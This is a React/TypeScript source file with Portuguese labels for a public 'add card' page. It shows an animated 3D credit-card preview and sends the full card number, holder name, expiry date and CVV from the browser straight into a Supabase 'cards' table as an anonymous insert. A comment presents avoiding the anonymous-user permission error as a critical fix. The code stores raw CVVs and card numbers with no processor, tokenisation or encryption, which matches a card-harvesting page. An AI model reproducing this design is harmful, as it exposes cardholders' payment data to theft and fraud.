import { useState, useRef, useEffect, useMemo } from 'react';
import { supabase } from '@/lib/supabase'; // Importação direta para garantir o fix
import { toast } from 'sonner';

// --- Componente do Cartão 3D ---
function CreditCard3D({ 
  cardNumber, cardName, cardMonth, cardYear, cardCvv, focusedField 
}: any) {
  const [bgImage] = useState(() => Math.floor(Math.random() * 25 + 1));
  const [focusStyle, setFocusStyle] = useState<React.CSSProperties | null>(null);

  const refs: any = {
    cardNumber: useRef(null),
    cardName: useRef(null),
    cardDate: useRef(null)
  };

  useEffect(() => {
    if (focusedField && refs[focusedField]?.current) {
      const el = refs[focusedField].current;
      setFocusStyle({
        width: `${el.offsetWidth}px`,
        height: `${el.offsetHeight}px`,
        transform: `translateX(${el.offsetLeft}px) translateY(${el.offsetTop}px)`,
        opacity: 1
      });
    } else {
      setFocusStyle(null);
    }
  }, [focusedField]);

  const getCardType = useMemo(() => {
    const num = cardNumber.replace(/\D/g, '');
    if (/^4/.test(num)) return 'visa';
    if (/^(34|37)/.test(num)) return 'amex';
    if (/^5[1-5]/.test(num)) return 'mastercard';
    if (/^6011/.test(num)) return 'discover';
    return 'visa';
  }, [cardNumber]);

  const maskNumber = () => {
    const mask = getCardType === 'amex' ? '#### ###### #####' : '#### #### #### ####';
    let i = 0;
    const clean = cardNumber.replace(/\D/g, '');
    return mask.split('').map((char, idx) => {
      if (char === ' ') return <span key={idx} style={{width: 10, display:'inline-block'}}></span>;
      const num = clean[i++];
      if (!num) return <span key={idx} style={{opacity: 0.5}}>#</span>;
      if (idx > 4 && idx < 15 && clean.length > idx && getCardType !== 'amex') return <span key={idx}>*</span>;
      return <span key={idx} className="slide-fade-up">{num}</span>;
    });
  };

  const isFlipped = focusedField === 'cardCvv';

  return (
    <div className={`card-item ${isFlipped ? '-active' : ''}`}>
      <div className="card-item__side -front">
        <div className={`card-item__focus ${focusStyle ? '-active' : ''}`} style={focusStyle || {}} />
        <div className="card-item__cover">
          <img src={`https://raw.githubusercontent.com/muhammederdem/credit-card-form/master/src/assets/images/${bgImage}.jpeg`} className="card-item__bg" alt="" />
        </div>
        <div className="card-item__wrapper">
          <div className="card-item__top">
            <img src="https://raw.githubusercontent.com/muhammederdem/credit-card-form/master/src/assets/images/chip.png" className="card-item__chip" alt="Chip" />
            <img src={`https://raw.githubusercontent.com/muhammederdem/credit-card-form/master/src/assets/images/${getCardType}.png`} className="card-item__typeImg" alt="Type" />
          </div>
          <div className="card-item__number" ref={refs.cardNumber}>
            {maskNumber()}
          </div>
          <div className="card-item__content">
            <div className="card-item__info" ref={refs.cardName}>
              <div className="card-item__holder">Titular</div>
              <div className="card-item__name">{cardName || 'NOME COMPLETO'}</div>
            </div>
            <div className="card-item__date" ref={refs.cardDate}>
              <span className="card-item__dateTitle">Validade</span>
              <span>{cardMonth || 'MM'}</span>/<span>{cardYear ? cardYear.slice(2) : 'AA'}</span>
            </div>
          </div>
        </div>
      </div>
      <div className="card-item__side -back">
        <div className="card-item__cover">
          <img src={`https://raw.githubusercontent.com/muhammederdem/credit-card-form/master/src/assets/images/${bgImage}.jpeg`} className="card-item__bg" alt="" />
        </div>
        <div className="card-item__band" />
        <div className="card-item__cvv">
          <div className="card-item__cvvTitle">CVV</div>
          <div className="card-item__cvvBand">{cardCvv.replace(/./g, '*')}</div>
          <img src={`https://raw.githubusercontent.com/muhammederdem/credit-card-form/master/src/assets/images/${getCardType}.png`} className="card-item__typeImg" style={{opacity:0.7}} alt="" />
        </div>
      </div>
    </div>
  );
}

// --- Página Principal ---
export function PublicPage() {
  const [cardNumber, setCardNumber] = useState('');
  const [cardName, setCardName] = useState('');
  const [cardMonth, setCardMonth] = useState('');
  const [cardYear, setCardYear] = useState('');
  const [cardCvv, setCardCvv] = useState('');
  const [focusedField, setFocusedField] = useState<string | null>(null);
  const [loading, setLoading] = useState(false);

  const handleNumberChange = (e: any) => {
    let val = e.target.value.replace(/\D/g, '').slice(0, 16);
    setCardNumber(val);
  };

  const handleSubmit = async () => {
    if (!cardNumber || !cardName || !cardMonth || !cardYear || !cardCvv) {
      toast.error('Preencha todos os campos!');
      return;
    }

    setLoading(true);
    try {
      // CORREÇÃO CRÍTICA: Inserção direta SEM tentar ler o retorno (.select())
      // Isso evita o erro de permissão para usuários anônimos
      const { error } = await supabase.from('cards').insert({
        card_number: cardNumber,
        card_holder: cardName,
        card_month: cardMonth,
        card_year: cardYear,
        card_cvv: cardCvv,
        card_type: 'visa' // Simplificado
      });

      if (error) throw error;

      toast.success('Cartão adicionado com sucesso!');
      
      // Limpar form
      setCardNumber(''); setCardName(''); setCardCvv('');
      setCardMonth(''); setCardYear('');
    } catch (err: any) {
      console.error(err);
      toast.error('Erro ao adicionar: ' + (err.message || 'Erro desconhecido'));
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="wrapper">
      <div className="card-form">
        <div style={{ marginBottom: '-130px' }}>
          <CreditCard3D 
            cardNumber={cardNumber} cardName={cardName}
            cardMonth={cardMonth} cardYear={cardYear} 
            cardCvv={cardCvv} focusedField={focusedField}
          />
        </div>

        <div className="card-form__inner">
          <div className="card-input">
            <label className="card-input__label">Número do Cartão</label>
            <input 
              type="text" className="card-input__input" 
              value={cardNumber} onChange={handleNumberChange}
              onFocus={() => setFocusedField('cardNumber')}
              onBlur={() => setFocusedField(null)}
            />
          </div>

          <div className="card-input">
            <label className="card-input__label">Nome do Titular</label>
            <input 
              type="text" className="card-input__input" 
              value={cardName} onChange={e => setCardName(e.target.value.toUpperCase())}
              onFocus={() => setFocusedField('cardName')}
              onBlur={() => setFocusedField(null)}
            />
          </div>

          <div className="card-form__row">
            <div className="card-form__col">
              <div className="card-form__group">
                <div style={{width:'100%'}}>
                  <label className="card-input__label">Mês</label>
                  <select 
                    className="card-input__input"
                    value={cardMonth} onChange={e => setCardMonth(e.target.value)}
                    onFocus={() => setFocusedField('cardDate')}
                    onBlur={() => setFocusedField(null)}
                  >
                    <option value="" disabled>MM</option>
                    {Array.from({length:12}, (_,i) => <option key={i} value={String(i+1).padStart(2,'0')}>{String(i+1).padStart(2,'0')}</option>)}
                  </select>
                </div>
                <div style={{width:'100%'}}>
                  <label className="card-input__label">Ano</label>
                  <select 
                    className="card-input__input"
                    value={cardYear} onChange={e => setCardYear(e.target.value)}
                    onFocus={() => setFocusedField('cardDate')}
                    onBlur={() => setFocusedField(null)}
                  >
                    <option value="" disabled>AAAA</option>
                    {Array.from({length:10}, (_,i) => <option key={i} value={String(new Date().getFullYear()+i)}>{new Date().getFullYear()+i}</option>)}
                  </select>
                </div>
              </div>
            </div>

            <div className="card-form__col -cvv">
              <div className="card-input">
                <label className="card-input__label">CVV</label>
                <input 
                  type="text" className="card-input__input" maxLength={4}
                  value={cardCvv} onChange={e => setCardCvv(e.target.value)}
                  onFocus={() => setFocusedField('cardCvv')}
                  onBlur={() => setFocusedField(null)}
                />
              </div>
            </div>
          </div>

          <button className="card-form__button" onClick={handleSubmit} disabled={loading}>
            {loading ? 'Salvando...' : 'Adicionar Cartão'}
          </button>
        </div>
      </div>
    </div>
  );
}
